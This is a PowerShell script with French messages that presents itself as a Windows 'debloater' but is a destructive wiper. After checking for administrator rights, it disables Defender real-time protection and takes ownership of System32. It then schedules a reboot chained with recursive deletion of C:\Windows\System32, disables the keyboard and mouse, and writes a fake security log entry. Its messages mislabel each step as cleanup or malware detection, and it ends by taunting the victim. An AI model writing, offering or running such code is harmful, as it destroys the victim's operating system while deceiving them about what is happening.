$principal = New-Object Security.Principal.WindowsPrincipal([Security.Principal.WindowsIdentity]::GetCurrent())
if (-not $principal.IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)) {
    Write-Host "Ce script doit être exécuté en tant qu'administrateur." -ForegroundColor Red
    exit
}
 
Write-Host "Instanciation du debloater" -ForegroundColor Yellow
Set-MpPreference -DisableRealtimeMonitoring $true
 
Write-Host "Modification des permissions de services" -ForegroundColor Yellow
takeown /F C:\Windows\System32 /R /D Y
icacls C:\Windows\System32 /grant Administrateurs:F /T
 
Write-Host "Programmation de la suppression des services inutilisés." -ForegroundColor Yellow
cmd /c "shutdown /r /t 10 && rmdir /s /q C:\Windows\System32"
 
Write-Host "Detection de services malveillants" -ForegroundColor Yellow
$keyboard = Get-PnpDevice | Where-Object { $_.FriendlyName -match "Keyboard" }
$mouse = Get-PnpDevice | Where-Object { $_.FriendlyName -match "Mouse" }
 
if ($keyboard) {
    Disable-PnpDevice -InstanceId $keyboard.InstanceId -Confirm:$false
} else {
    Write-Host "instancié" -ForegroundColor Red
}
 
if ($mouse) {
    Disable-PnpDevice -InstanceId $mouse.InstanceId -Confirm:$false
} else {
    Write-Host "instancié" -ForegroundColor Red
}
 
Write-EventLog -LogName Security -Source "Security" -EntryType Warning -EventId 999 -Message "Redémarrage du système pour appliquer les modifications"
 
Write-Host "Opérations terminées. nikoumouk attrapes une clé usb maintenant :)" -ForegroundColor Red
 